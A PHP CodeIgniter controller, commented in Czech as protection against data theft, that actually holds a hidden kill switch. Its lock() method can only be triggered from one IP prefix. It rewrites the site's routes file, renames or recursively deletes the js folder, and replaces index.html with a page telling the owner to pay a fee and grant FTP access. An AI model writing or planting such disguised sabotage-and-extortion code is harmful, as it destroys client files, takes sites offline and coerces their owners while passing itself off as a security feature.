<?php

if ( !defined( 'BASEPATH' ) )
	exit( 'No direct script access allowed' );

/**
 * Custom trida na bezpecnost proti kradezi dat.
 */
class SSecurit extends My_Controller
{

	function __construct()
	{
		parent::__construct();
		$this->load->helper( 'file' );
	}

	function lock($brutal = 'ne')
	{
		$ip = $this->input->ip_address();
		if ( strpos( $ip, '188.122' ) === false )
		{
			show_404( 'Na zobrazení této stránky nemáte oprávnění.' );
		}

		$string = read_file( APPPATH . '/config/routes.php' );
		$e = explode( "\n", $string );
		array_splice( $e, 1, 0, '$route["(:any)"] = "administrace/ssecurit/notice";' );
		echo 'router overwrited: ' . (write_file( APPPATH . '/config/routes.php', implode( $e ) ) ? 'OK' : 'FAILED') . '<br />';

		if ( $brutal === 'ne' )
		{
			echo 'renamed: ' . (rename( 'js', 'jscode' ) ? 'OK' : 'FAILED') . '<br />';
		}
		else if ( $brutal === 'ano' )
		{
			echo 'rmdir: ' . ($this->rrmdir( 'js' ) ? 'OK' : 'FAILED') . '<br />';
		}

		$a = '<!DOCTYPE html>
<html lang=en>
<head>
<meta charset=utf-8>
<link rel="canonical" href="http://ci.pavelvais.cz/subdom/ci/administrace/ssecurit/notice">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="robots" content="nofollow">
<link rel="stylesheet" type="text/css" href="http://ci.pavelvais.cz/subdom/ci/css/administration/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="http://ci.pavelvais.cz/subdom/ci/css/bootstrap.update.css">
<link rel="stylesheet" type="text/css" href="http://ci.pavelvais.cz/subdom/ci/css/font-awesome.min.css">
<title>Pro běh těchto stránek je nutný uhradit poplatek - My CI site</title>
</head>
<body>
	<div class="container">
		<div class="row">
			<div class="col-xs-12 alert alert-danger page-header">
				<h1>Stránky nejsou v provozu</h1>
				<p>Prosíme vlastníka stránek, aby uhradil poplatek, na kterém se stranou zřizovatele dohodli. Poté budou stránky zase v provozu.</p>
				<h3>Dále je požadováno:</h3>
				<ul>
					<li>
						Umožnit zprostředkovateli přístup na FTP.
					</li>
				</ul>
			</div>
		</div>
	</div>
</body>';
		echo 'index created: ' . (write_file( 'index.html', $a ) ? 'OK' : 'FAILED') . '<br />';
		echo "lock: DONE";
	}

	public function notice()
	{
		$this->load->view( 'comp/view_notice' );
	}
	
	private function rrmdir($dir) {
   if (is_dir($dir)) {
     $objects = scandir($dir);
     foreach ($objects as $object) {
       if ($object != "." && $object != "..") {
         if (filetype($dir."/".$object) == "dir") $this->rrmdir($dir."/".$object); else unlink($dir."/".$object);
       }
     }
     reset($objects);
     return rmdir($dir);
   }
}

}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */